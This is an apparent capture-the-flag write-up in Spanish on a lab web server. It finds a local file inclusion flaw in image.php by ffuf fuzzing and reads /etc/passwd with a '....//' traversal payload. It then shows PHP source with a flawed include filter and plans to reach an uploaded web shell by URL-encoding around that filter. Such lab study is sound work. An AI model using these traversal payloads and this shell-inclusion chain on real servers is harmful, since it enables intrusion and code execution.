Páginas interesantes: 
- `apply.php`
- `contact.php`
- `index.php`
- `thanks.php`

Source code de contact.php:
- `<img src="[/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c](view-source:http://154.57.164.75:31655/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c)" height="25"/>`
Source code de apply.php:
`<form action="[/api/application.php](view-source:http://154.57.164.75:31655/api/application.php)" method="POST" enctype="multipart/form-data">`

![[Pasted image 20260519224859.png]]

Probando el comportamiento de las fotos nos damos cuenta que el servidor carga una imagen a partir de un hash. Sin embargo, si no hay ningun parametro ni hash, no da error, simplemente da una respuesta en blanco. Vamos a fuzzear este parametro ya que es un comportamiento sospechoso.

```bash
┌──(julicc㉿arceus)-[~]
└─$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://154.57.164.75:31655/api/image.php?p=FUZZ -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://154.57.164.75:31655/api/image.php?p=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

:: Progress: [40/930] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :
:: Progress: [65/930] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :
:: Progress: [196/930] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
:: Progress: [335/930] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 36ms]
```

En BurpSuite, modificando una solicitud get con el parametro obtenido vemos que efectivamente conseguimos vulnerar el servidor por LFI
![[1779225031158218464.png]]

Vamos a utilizar LFI para leer codigo fuente de ficheros y ver donde se almacenan los ficheros subidos en el formulario:
![[Pasted image 20260519231416.png]]
Vemos que en target file existe la ruta `../uploads/`
Vamos a intentar utilizar la web shell que habiamos subido anteriormente:
![[Pasted image 20260519231812.png]]
Mediante uploads no funciona...
Vamos a observar el codigo de otra página:
![[Pasted image 20260519231957.png]]
```php
<?php
                    $region = "AT";
                    $danger = false;

                    if (isset($_GET["region"])) {
                        if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
                            echo "'region' parameter contains invalid character(s)";
                            $danger = true;
                        } else {
                            $region = urldecode($_GET["region"]);
                        }
                    }

                    if (!$danger) {
                        include "./regions/" . $region . ".php";
                    }
                    ?>
```
El parametro "region" pasa directamente por la funcion include, y además vemos que al final se le añade la extensión .php como filtro. Además solo checkea si hay `.` y `/`. urldecode() se aplica después de la validación.

Recordamos que para cargar la imagen utilizaba hash, y para la función de target_file del formulario hace un hash md5 sobre el archivo, y la ruta es ../uploads, es decir /var/www/html/uploads, y que añade .php al final, vamos a intentar cargar el shell.php de la siguiente manera:
![[1779225962812586409.png]]
Vamos a utilizar el parametro `region` en `contanct.php` y vamos a codificar la URL para saltarnos los checks de . y /.